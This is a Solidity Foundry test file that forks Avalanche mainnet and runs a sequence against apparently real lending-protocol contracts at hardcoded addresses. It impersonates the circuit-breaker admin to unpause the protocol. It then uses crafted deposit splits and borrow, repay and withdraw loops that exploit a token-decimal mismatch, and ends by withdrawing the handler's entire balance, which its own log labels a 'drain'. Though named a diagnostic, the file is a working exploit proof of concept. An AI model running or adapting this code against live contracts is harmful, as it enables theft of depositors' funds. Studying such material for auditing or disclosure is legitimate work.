// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Test, console2} from "forge-std/Test.sol";
interface IERC20A { function approve(address,uint256) external; function balanceOf(address) external view returns (uint256); function decimals() external view returns (uint8); }
interface IHA { function deposit(uint256,bool) external; function borrow(uint256,bool) external; function withdraw(uint256,bool) external; function repay(uint256,bool) external; }
interface ITMA { function setCircuitBreaker(bool) external; function getCircuitBreaker() external view returns (bool); }
interface IHVA { function handlerViewProxy(bytes calldata) external returns (bool, bytes memory); }
contract AvaxDiagTest is Test {
    address constant TM=0x74326D2bFBF22312158850AC3B4F7AE8A0a347fD;
    address constant H=0x8385Ea36dD4BDC84B3F2ac718C332E18C1E42d36;
    address constant T=0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664;
    address constant BRK=0x2184AD186Ff046E1038d9eBbEFAB82e297F37E95;
    function setUp() public { vm.createSelectFork("https://avalanche-c-chain-rpc.publicnode.com"); }
    function amt(address who) internal returns (uint256 d,uint256 b){ (bool ok, bytes memory r)=IHVA(H).handlerViewProxy(abi.encodeWithSignature("getUserAmountWithInterest(address)",who)); require(ok,"view"); (d,b)=abi.decode(r,(uint256,uint256)); }
    function test_avax_diag() public {
        vm.prank(BRK); ITMA(TM).setCircuitBreaker(false);
        console2.log("unpaused", !ITMA(TM).getCircuitBreaker());
        uint256 h0=IERC20A(T).balanceOf(H); console2.log("h0",h0);
        uint256 D=100_000e18; // unified; token is 6 dec
        deal(T, address(this), 100_000e6);
        IERC20A(T).approve(H, type(uint256).max);
        uint256 a=D;
        IHA(H).deposit(a*2995/1_000_000,false);
        IHA(H).deposit(a*11964/1_000_000,false);
        IHA(H).deposit(a*44327/1_000_000,false);
        IHA(H).deposit(a*178736/1_000_000,false);
        IHA(H).deposit(a - a*2995/1_000_000 - a*11964/1_000_000 - a*44327/1_000_000 - a*178736/1_000_000,false);
        IHA(H).deposit(0,false);
        (uint256 d1,uint256 b1)=amt(address(this)); console2.log("dep",d1); console2.log("bor",b1);
        for (uint i=0;i<20;i++) IHA(H).borrow(a*37/1000,false);
        (uint256 d2,uint256 b2)=amt(address(this)); console2.log("dep2",d2); console2.log("bor2",b2);
        for (uint i=0;i<20;i++){ IHA(H).repay(a*37/1000,false); IHA(H).withdraw(a*5/100,false); }
        (uint256 d3,uint256 b3)=amt(address(this)); console2.log("dep3",d3); console2.log("bor3",b3); console2.log("hbal",IERC20A(T).balanceOf(H));
        IHA(H).repay(type(uint256).max,false);
        uint256 bal=IERC20A(T).balanceOf(H); console2.log("bal before drain",bal);
        if (bal>0) IHA(H).withdraw(bal*1e12,false);
        console2.log("my end",IERC20A(T).balanceOf(address(this)));
        console2.log("h end",IERC20A(T).balanceOf(H));
    }
}
